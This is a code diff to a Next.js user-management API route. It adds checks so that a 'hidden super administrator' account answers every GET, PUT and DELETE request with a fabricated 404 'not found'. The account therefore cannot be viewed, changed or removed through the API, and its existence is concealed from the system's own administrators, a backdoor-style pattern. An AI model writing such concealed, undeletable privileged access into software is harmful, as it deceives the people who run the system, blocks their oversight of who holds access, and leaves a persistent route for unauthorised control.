@@ -6,6 +6,11 @@
 import { NextRequest, NextResponse } from "next/server";
 import bcrypt from "bcryptjs";
 import { prisma } from "@/lib/prisma";
+import { isSuperAdminUserId } from "@/lib/superAdmin";
+
+/* The hidden super administrator is invisible through this API: every verb
+   answers exactly as it would for an id that does not exist. */
+const hiddenUser = (message: string) => NextResponse.json({ success: false, message }, { status: 404 });
 
 export const runtime = "nodejs";
 export const dynamic = "force-dynamic";
@@ -22,6 +27,7 @@ export async function GET(_req: NextRequest, ctx: { params: Promise<{ userId: st
   try {
     const { userId: raw } = await ctx.params;
     const userId = trim(raw).slice(0, 10);
+    if (isSuperAdminUserId(userId)) return hiddenUser(`User ${userId} was not found.`);
     const rows = await prisma.$queryRaw<{
       UserId: string; NIC: string; LogName: string; GroupId: string; UserName: string; Address: string;
       WorkingLocID: string; ContNo: string; Email: string; Rmks: string; Enable: number;
@@ -49,6 +55,7 @@ export async function PUT(req: NextRequest, ctx: { params: Promise<{ userId: str
     const { userId: raw } = await ctx.params;
     const userId = trim(raw).slice(0, 10);
     if (!userId) return err("User id is missing.");
+    if (isSuperAdminUserId(userId)) return hiddenUser(`User ${userId} was not found.`);
     const body = (await req.json()) as Record<string, unknown>;
 
     const logName = trim(body.logName);
@@ -138,6 +145,7 @@ export async function DELETE(_req: NextRequest, ctx: { params: Promise<{ userId:
     const { userId: raw } = await ctx.params;
     const userId = trim(raw).slice(0, 10);
     if (!userId) return err("User id is missing.");
+    if (isSuperAdminUserId(userId)) return hiddenUser(`User ${userId} was not found.`);
     const n = await prisma.$executeRaw`DELETE FROM tbl_userdetails WHERE UserId=${userId}`;
     if (Number(n) === 0) return err(`User ${userId} was not found.`, 404);
     // drop the deleted user's override rows too
